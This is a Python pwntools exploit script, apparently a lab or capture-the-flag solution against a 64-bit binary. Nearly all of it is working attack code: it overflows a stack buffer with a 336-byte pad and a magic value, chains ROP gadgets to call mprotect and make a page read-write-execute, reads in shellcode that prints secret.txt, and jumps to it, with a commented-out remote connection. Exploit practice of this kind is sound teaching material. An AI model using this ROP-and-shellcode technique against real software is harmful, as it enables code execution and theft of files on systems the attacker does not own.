import os
from pwn import *

IP = "0.0.0.0"
PORT = 0

context.arch = "amd64"

file_secret = "secret.txt"
file_binary = "10100_ILIN_Mykola_64"
file_breakpoints = "breaks64.gdb"

# GADGETS
pop_rax = p64(0x449857)  # pop rax; ret
pop_rdi = p64(0x40191a)  # pop rdi; ret
pop_rsi = p64(0x40f55e)  # pop rsi; ret
pop_rdx = p64(0x40181f)  # pop rdx; ret
syscall = p64(0x485ac9)  # syscall; ret
add_rax_rdi = p64(0x42a403)  # add rax, rdi; ret


def run_local(debug = True, wsl2 = True):
    p = process([f"./{file_binary}"])
    pid = util.proc.pidof(p)[0]
    if debug == False:
        return p
    if wsl2 == False:  # Debug in Linux
        log.info(f"Waiting for GDB...\n"
                 f"$ gdb -q -p {pid}")
        pause()
        return p

    # Debug in WSL2
    gdb = f"gdb -q -p {pid} -x {file_breakpoints}"
    log.debug(f"Gdb uses breakpoints from {file_breakpoints}")

    new_tab = "wt -p 'PowerShell' -d ."  # Open new tab in Windows Terminal (PowerShell profile and current dir)
    wsl = f"wsl -e bash -c '{gdb}\; exec $BASH'"
    cmd = f"cmd.exe /c start {new_tab} {wsl}"
    os.system(cmd)
    util.proc.wait_for_debugger(pid)
    return p


def find_bad_bytes(buf, bad_bytes = None):
    if bad_bytes is None:
        bad_bytes = [
            0xa,  # 0xa = 10 = "\n", gets() takes all the chars up to "\n"
        ]
    found = False
    for i, byte in enumerate(buf):
        if byte in bad_bytes:
            log.warn(f"Bad byte '{hex(byte)}' at {i}")
            found = True
    if found:
        print(hexdump(buf, highlight = bad_bytes))
        log.error("Found bad bytes in a buffer!")


# SET REGISTER
def set_rax(value):
    buf = b""
    buf += pop_rax
    buf += p64(value)
    return buf


def set_rdi(value):
    buf = b""
    buf += pop_rdi
    buf += p64(value)
    return buf


def set_rsi(value):
    buf = b""
    buf += pop_rsi
    buf += p64(value)
    return buf


def set_rdx(value):
    buf = b""
    buf += pop_rdx
    buf += p64(value)
    return buf


# CALL FUNCTION
def sys_mprotect(address, length, protection):
    num_mprotect = 10
    buf = b""

    # rax = 10 = 0xa
    buf += pop_rax
    buf += p64(9)
    buf += pop_rdi
    buf += p64(1)
    buf += add_rax_rdi

    buf += set_rdi(address)
    buf += set_rsi(length)
    buf += set_rdx(protection)

    buf += syscall
    return buf


def sys_read(fd, address, length):
    num_read = 0
    buf = b""

    buf += set_rdi(fd)
    buf += set_rsi(address)
    buf += set_rdx(length)

    buf += set_rax(num_read)
    buf += syscall
    return buf


def main():
    sc = asm(shellcraft.cat(file_secret) + shellcraft.echo("\n") + shellcraft.exit(22))

    # Buffer overflow (with return address overwriting)
    buf = b"A" * 336
    buf += p32(1337)
    buf = buf.ljust(1672, b"B")

    # mprotect()
    rwx_addr = 0x400000
    rwx_length = 1 * 0x1000  # Should be multiple of 0x1000 = 4096 bytes = 1 RAM page
    rwx_mode = 7  # RWX = read | write | execute = 7
    buf += sys_mprotect(rwx_addr, rwx_length, rwx_mode)

    # read()
    stdin_fd = 0
    buf += sys_read(stdin_fd, rwx_addr, len(sc))
    buf += p64(rwx_addr)  # Jump to RWX buffer

    find_bad_bytes(buf)

    # RUN PROCESS
    p = run_local(debug = True, wsl2 = True)
    # p = remote(IP, PORT)

    log.info("=== buffer")
    print(hexdump(buf))
    p.readline()
    p.writeline(buf)
    p.readuntil(b"GRANTED!")

    # pause()
    log.info("=== shellcode")
    print(hexdump(sc))
    p.writeline(sc)
    flag = p.readall().strip().decode()
    log.success(f"FLAG = {flag}")


if __name__ == "__main__":
    main()
